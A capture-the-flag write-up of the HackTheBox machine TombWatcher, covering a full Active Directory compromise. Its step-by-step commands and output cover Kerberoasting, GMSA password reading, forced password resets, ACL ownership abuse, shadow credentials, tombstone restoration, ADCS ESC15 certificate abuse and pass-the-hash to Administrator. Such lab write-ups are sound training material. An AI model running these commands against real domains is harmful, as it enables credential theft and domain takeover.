---
title: "HackTheBox - TombWatcher"
author: Nasrallah
description: ""
date: 2025-11-17 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, tombstoned, adcs, certipy, shadowcredentials, acl, bloodhound, ldap]
img_path: /assets/img/hackthebox/machines/tombwatcher
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[TombWatcher](https://app.hackthebox.com/machines/tombwatcher)

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for tombwatcher.htb (10.10.11.72)                 
Host is up (0.12s latency).                                                                    
Not shown: 988 filtered tcp ports (no-response)                          
PORT     STATE SERVICE       VERSION   
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0               
|_http-server-header: Microsoft-IIS/10.0
| http-methods:     
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-12 21:21:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb         
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59                                                        
|_Not valid after:  2025-11-16T00:47:59                                                        
|_ssl-date: 2025-06-12T21:23:11+00:00; +3h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-06-12T21:23:10+00:00; +3h59m59s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-12T21:23:11+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-12T21:23:10+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-12T21:22:33
|_  start_date: N/A
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s
```

The target is active directory domain controller, they provided the following credentials`henry / H3nry_987TGV!`

### SMB

I'll first test the credentials on SMB

```terminal
└──╼[★]$ nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!'                        
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domin:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
```

They work fine, now I'll list shares

```terminal
[★]$ nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domin:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share 
```

No interesting shares.

Before I continue, I'll generate a hosts file and copy it to my `/etc/hosts` file.

```terminal
$ nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --generate-hosts-file file
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domin:tombwatcher.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 

[★]$ cat file                         
10.129.232.167     DC01.tombwatcher.htb tombwatcher.htb DC01

[★]$ cat file | sudo tee -a /etc/hosts                                            
[sudo] password for sirius: 
10.129.232.167     DC01.tombwatcher.htb tombwatcher.htb DC01
```

### ACLs

Let's run bloodhound collection tool

```terminal
[★]$ bloodhound-ce-python -d tombwatcher.htb -dc DC01.tombwatcher.htb -ns 10.129.232.167 -u henry -p 'H3nry_987TGV!' -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 25S
INFO: Compressing output into 20251014084607_bloodhound.zip
```

#### Write SPN

I'll open the zip file in bloodhound and list the outbound object control of user `henry`.

![image.png](image.png)

This shows that the user henry has WriteSPN on user `alfred`

We can also see it using `powerview.py`

```terminal
[★]$ powerview henry:'H3nry_987TGV!'@tombwatcher.htb
Logging directory is set to /home/sirius/.powerview/logs/henry-tombwatcher.htb
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Henry]-[NS:<auto>]
╰─PV ❯ Get-ObjectAcl -SecurityIdentifier henry -Select AccessMask,ActiveDirectoryRights,ObjectAceType,ObjectDN -ResolveGUIDs -TableView       
[2025-10-14 08:55:31] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while

AccessMask     ActiveDirectoryRights    ObjectAceType           ObjectDN
-------------  -----------------------  ----------------------  ----------------------------------------
WriteProperty  None                     Service-Principal-Name  CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
```

To exploit this we can do a targeted kerberoast attack using `targetedkerberoast.py`.

```terminal
[★]$ targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --request-user alfred 

[*] Starting kerberoast attacks
[*] Attacking user (alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$c01c52163e26ee550c9227d2189bf6a6$7db9a52a30c34cb57bbb963202228a370185173d6eb127d9154eabb1141013cd0f6bd5b22bf983152010581d48a6360f4f23478c94a3ac07b29231881b7388d0e1d204b33fc5e343f0fd3d4380a5e3677b5885e1e77c2ab5e150327f03eb762f1648df8f66cfc71eb8bafc6f792f76e5e12ab39e7bf0381b2ac8c66a7be6708c1f03e188de65aa69797fbbd9bac35053120c13a1245dedfbade5c29c9d037698a717f6b301a39e196b913ba832856f1a146e3ca4e4a549553c691f87578a1c23b70e066a0a79eb2f21e410e905a3230df28155d1cd790a2aca9134030bc5f41778d8e452d2ca6bf5623ffc62e59399742d1f6cb4ed5aa0a9038921eb3bf80aebf307506f4b5bd7fbd892adcf8aee0d0e6f98b30de32bdb6a7d73e1ecea78e5eec19aba1f5191ce120a38149c7a3b1bd4f04476e3c10bb8f7afbc64c5845a4fc32c4e128e728d3c5acc8b4de2bff4ee4d63f17be6d1804c88e5091b197a6f200fb1e3ca7fc47e246a87702a5ca0733a4bb3133b49d8e0dc97b0557f9ba7c4a2bfdda14a22d4d280983cdc4a991dce1bfdea514a8a8fcbc72a3d8c74bb87d187e1d9340d887b63b4bf93f13aa75c7e8ed6f3cbd025924841cdc0732a4fda15a5152c9bf39b38baef90fc6decd442a40d4b1704072e1eb4a1c16a286d8dd6d2f2c8a178ed408626a59318e80ed7e38e9f59123d25559e435db5928e6a7006741fcaee18b33b397ae7e97e3910bd9a8c7998f8ec64c18d9a1d1cb2fbb1e9c4ebca11094ae8f368f5ac38cc5ee24ffcd4bfe573c957158a023f819f37ea03bf44dd0f63bc0e6a2488ed022aa144da334cfcde2390d440124420a023c73ebf8595afdc7862341ad0a94efd797b158b7eb97ba8d0b60ea28cb01f1d5ca1cc234ef9f94f68d950065a86f1f31745dddd7b7f54d45b80302d6036f6721adf808e5409347f1324f3b2d6be826e60e6f1601b334fd28166e7dc1ba5fd688cbf515a388966981e2c4e8319c83061a1d61dcd361d0b493313b3b82b74769451de383a437a5c24f9fb84de94e6c921a6b3fc353dbf067ce4dc159fcc1934ba2f04e5b6bc46a1282435d6aa808c5b15bb458eb3327ff68f8400ace2c1386df6d854af42ee43a4756512240c37f811c816bd0a28073b80728f154dc583775215dcd22a0a3570c3953e537f08ac2d09264d8235f5c776c682e10f47d83e6c6f156be8604830194ffded5c0f910e39d9b22e27f8db9a95b499fc6fe11eecfa11cbaa04cdca9654756cc287417724892cd5da7c6fcba2c96c2cde2da61392606ef786177bd06976de5324f47bf168dd49b222281eca4c09713965774e1af949a568e1256c0d5d2695103b4f52094c57ac523669caa5b5bf0fa4c602f21251c9085151cd282e43c0c796284d7ce3fce7a5c013983c53ee121327f2479c56762c852c30af1043849db60674ea4c5156e68b9d537144c48c67a752caf915ff0e
```

We got a hash of user `alfred`, let's crack it.

```bash
[★]$ hashcat hash /usr/share/wordlists/rockyou.txt -m 13100          
hashcat (v6.2.6) starting  
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb\Alfred*$babba8b[SNIP]09323:basketball
```

It cracked to `basketball`

#### AddSelf

Let's list outbounds of user `alfred`

![image.png](image%201.png)

This shows that the user can add itself to the `Infrastructure` group

```bash
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Henry]-[NS:<auto>]
╰─PV ❯ Get-ObjectAcl -SecurityIdentifier alfred -Select AccessMask,ActiveDirectoryRights,ObjectAceType,ObjectDN -ResolveGUIDs -TableView
[2025-10-14 09:26:08] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while

AccessMask    ActiveDirectoryRights    ObjectAceType    ObjectDN
------------  -----------------------  ---------------  ------------------------------------------------
Self          Self                     None             CN=Infrastructure,CN=Users,DC=tombwatcher,DC=htb
```

I'll use bloodyAD to add the user to the group.

```bash
[★]$ bloodyAD --host tombwatcher.htb -d dc01.tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```

#### GMSA

Listing outbounds of Infrastructure group

![image.png](image%202.png)

The group can read the GMSA password of `ansible_dev$`

```bash
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Henry]-[NS:<auto>] [CACHED]
╰─PV ❯ Get-DomainGMSA 
ObjectDnsHostname           : TOMBWATCHER.HTB
ObjectSAN                   : ansible_dev$
ObjectSID                   : S-1-5-21-1392491010-1358638721-2126982587-1108
PrincipallAllowedToRead     : TOMBWATCHER\Infrastructure
```

I'll use netexec to get the NT hash of `ansible_dev$`

```bash
[★]$ nxc ldap 10.129.232.167 -u alfred -p basketball --gmsa
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\alfred:basketball 
LDAP        10.129.232.167  389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         NTLM: bf8b11e301f7ba3fdc616e5d4fa01c30     PrincipalsAllowedToReadPassword: Infrastructure
```

#### Change password

Listing outbound of `ansible_dev$`

![image.png](image%203.png)

The object can change the password of user `sam`

```bash
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Henry]-[NS:<auto>]
╰─PV ❯ Get-ObjectAcl -SecurityIdentifier 'Ansible_Dev$' -Select AccessMask,ActiveDirectoryRights,ObjectAceType,ObjectDN -ResolveGUIDs -TableView
[2025-10-14 09:51:44] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while

AccessMask     ActiveDirectoryRights    ObjectAceType               ObjectDN
-------------  -----------------------  --------------------------  -------------------------------------
ControlAccess  None                     User-Force-Change-Password  CN=sam,CN=Users,DC=tombwatcher,DC=htb
```

I'll use the following bloodyAD command to change the password

```bash
[★]$ bloodyAD --host dc01.tombwatcher.htb -d $tombwatcher.htb -u ansible_dev$ -p :bf8b11e301f7ba3fdc616e5d4fa01c30 set password sam SiriusPassword123
[+] Password changed successfully!
```

## **Foothold**

### WriteOwner

Listing outbound of `sam`

![image.png](image%204.png)

Sam has the ability to modify the owner of the user `John`.

```bash
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Henry]-[NS:<auto>]
╰─PV ❯ Get-ObjectAcl -SecurityIdentifier 'sam' -Select AccessMask,ActiveDirectoryRights,ObjectAceType,ObjectDN -ResolveGUIDs -TableView         
[2025-10-14 09:52:06] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while

AccessMask    ActiveDirectoryRights    ObjectAceType    ObjectDN
------------  -----------------------  ---------------  --------------------------------------
WriteOwner    WriteOwner               None             CN=john,CN=Users,DC=tombwatcher,DC=htb
```

To exploit this I'll modify the owner of `john` to be `sam` then give sam `fullcontrol` rights over `john`, this allows me to either perform a targeted kerberoast attack, shadow credentials attack or change the password of user john

I'll use `owneredit.py` to change the ownership to sam.

```bash
[★]$ owneredit.py -action write -new-owner sam -target john tombwatcher.htb/sam:SiriusPassword123
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```

Now I'll use `dacedit` to give sam `fullcontroll`

```bash
[★]$ dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'SiriusPassword123'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251014-155004.bak
[*] DACL modified successfully!
```

For the shadow credentials attack we can use the following bloodyAD command.

```bash
[★]$ bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p SiriusPassword123 add shadowCredentials john                                
[+] KeyCredential generated with following sha256 of RSA key: 49a4ec445bff32217b79b36ae3244ff72b988109798c8cc7faa27c357a357bc0
[+] TGT stored in ccache file john_vD.ccache

NT: ad9324754583e3e42b55aad4d3b8d2bf
```

I'll change the password instead.

```bash
[★]$ bloodyAD --host dc01.tombwatcher.htb -d $tombwatcher.htb -u sam -p SiriusPassword123 set password john Password123                                                                   
[+] Password changed successfully!
```

## **Privilege Escalation**

### TombStoned User

Listing `john` `outbounds` using `powerview.py`

```bash
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Henry]-[NS:<auto>]
╰─PV ❯ Get-ObjectAcl -SecurityIdentifier john -Select AccessMask,ActiveDirectoryRights,ObjectAceType,ObjectDN -ResolveGUIDs -TableView
[2025-10-14 10:04:05] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while

AccessMask     ActiveDirectoryRights    ObjectAceType         ObjectDN
-------------  -----------------------  --------------------  -----------------------------
FullControl    FullControl              None                  OU=ADCS,DC=tombwatcher,DC=htb
ControlAccess  None                     Reanimate-Tombstones  DC=tombwatcher,DC=htb

```

This shows `Reanimate-Tombstones` right on the domain.

>An Active Directory tombstone is a deleted object that is not fully removed but instead kept in the directory for a period of time to ensure the deletion is replicated to all domain controllers
{: .prompt-info }

`john` is a member of `Remote Management Users` so we can get a shell using `evil-winrm`

```terminal
[★]$ evil-winrm-py -i tombwatcher.htb -u john -p Password123
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'tombwatcher.htb:5985' as 'john'
evil-winrm-py PS C:\Users\john\Documents> whoami
tombwatcher\john

```

Now I'll list deleted object.

```powershell
evil-winrm-py PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List

Name            : cert_admin
                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectGUID      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1109
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectGUID      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1110
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

Name            : cert_admin
                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectGUID      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid       : S-1-5-21-1392491010-1358638721-2126982587-1111
lastKnownParent : OU=ADCS,DC=tombwatcher,DC=htb

```

I got three outputs back, all for the same user cert_admin.

I'll restore the one with the rid `1111` since it is the last one.

```powershell
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

#### GenericAll

Using powerview again we see that user john has fullcontroll over cert_admin

```bash
╭─LDAPS─[DC01.tombwatcher.htb]─[TOMBWATCHER\Henry]-[NS:<auto>] [CACHED]
╰─PV ❯ Get-ObjectAcl -SecurityIdentifier john -Select AccessMask,ActiveDirectoryRights,ObjectAceType,ObjectDN -ResolveGUIDs -TableView
[2025-10-14 19:17:23] [Get-DomainObjectAcl] Recursing all domain objects. This might take a while

AccessMask     ActiveDirectoryRights    ObjectAceType         ObjectDN
-------------  -----------------------  --------------------  -------------------------------------------
FullControl    FullControl              None                  CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
FullControl    FullControl              None                  OU=ADCS,DC=tombwatcher,DC=htb
ControlAccess  None                     Reanimate-Tombstones  DC=tombwatcher,DC=htb
```

I'll change the password

```bash
[★]$ bloodyAD --host dc01.tombwatcher.htb -d $tombwatcher.htb -u john -p Password123 set password cert_admin Password123                                                                  
[+] Password changed successfully!
```

### ADCS

I'll use `cert_admin` to list vulnerable certificates

```terminal
[★]$ certipy find -vulnerable  -target dc01.tombwatcher.htb -u cert_admin -p Password123 -ns 10.129.232.167 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)    
                                 
[*] Finding certificate templates
[*] Found 33 certificate templates        
[*] Finding certificate authorities       
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies    
[*] Found 13 issuance policies   
[*] Found 0 OIDs linked to templates      
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP           
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'       
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'                                                                                                                
[!] Error checking web enrollment: timed out                             
[!] Use -debug to print a stacktrace      
[*] Enumeration output:   
Certificate Templates   [8/11246]
  0                                                                                            
    Template Name                       : WebServer                 
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1                                  
    Enabled                             : True
    Client Authentication               : False                          
    Enrollment Agent                    : False 
    Any Purpose                         : False                         
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False 
    Requires Key Archival               : False 
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

The certificate `WebServer` is vulnerable to [ESC15](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)

I"ll use `Scenario B` as Scenario A didn't work for me.

First I'll request a cert of user cert_admin

```terminal
[★]$ certipy req -u 'cert_admin@tombwatcher.htb' -p 'Password123' -dc-ip '10.129.232.167' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'    
Certipy v5.0.3 - by Oliver Lyak (ly4k)                                   
                                 
[*] Requesting certificate via RPC                                       
[*] Request ID is 15             
[*] Successfully requested certificate                                   
[*] Got certificate without identity                                     
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'               
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

Now we se this certificate to request a certificate on behalf of Administrator.

```terminal
[★]$ certipy req -u cert_admin -p 'Password123' -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'          
Certipy v5.0.3 - by Oliver Lyak (ly4k)
                    
[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Now we can retrieve the administrator's NTML hash using the certificate.

```terminal
[★]$ certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

I'll get a shell now using `evil-winrm`

```terminal
[★]$ evil-winrm-py -i tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
          _ _            _                              
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

[*] Connecting to 'tombwatcher.htb:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

## **References**

<https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
